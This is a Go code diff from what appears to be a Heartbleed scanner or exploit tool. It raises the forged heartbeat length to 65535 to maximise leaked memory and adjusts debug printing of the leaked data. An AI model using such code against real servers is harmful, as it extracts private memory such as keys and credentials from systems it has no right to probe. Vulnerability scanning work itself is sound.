@@ -29,7 +29,7 @@ var padding = []byte("YELLOW SUBMARINE")
 //    opaque padding[padding_length];
 // } HeartbeatMessage;
 func buildEvilMessage(payload []byte) []byte {
-	var myluckynumber uint16 = 64000
+	var myluckynumber uint16 = 65535
 	buf := bytes.Buffer{}
 	err := binary.Write(&buf, binary.BigEndian, uint8(1))
 	if err != nil {
@@ -54,9 +54,9 @@ func buildEvilMessage(payload []byte) []byte {
 func heartbleedCheck(conn *tls.Conn, buf *bytes.Buffer, vuln chan bool) func([]byte) {
 	return func(data []byte) {
 	  	//spew.Printf("buf: %v -- data: %+v", buf, data)
-		fmt.Printf("Before Fdump: buf - %s ... data - %s",  buf, data)
+		fmt.Printf("data - %s\n", data)
 		spew.Fdump(buf, data)
-		fmt.Printf("After Fdump: buf - %s ... data - %s",  buf, data)
+		fmt.Printf("data - %s", data)
 		if bytes.Index(data, padding) == -1 {
 			vuln <- false
 		} else {
@@ -114,8 +114,8 @@ func Heartbleed(tgt *Target, payload []byte) (out []byte, err error) {
 		conn.Close()
 		if status {
 			out = buf.Bytes()
-			spew.Printf("out spew: %v" , out)
-			fmt.Printf("out fmt: %s" , out)
+			//spew.Printf("out spew: %v" , out)
+			//fmt.Printf("out fmt: %s" , out)
 			return out, nil // VULNERABLE
 		} else if err != nil {
 			return
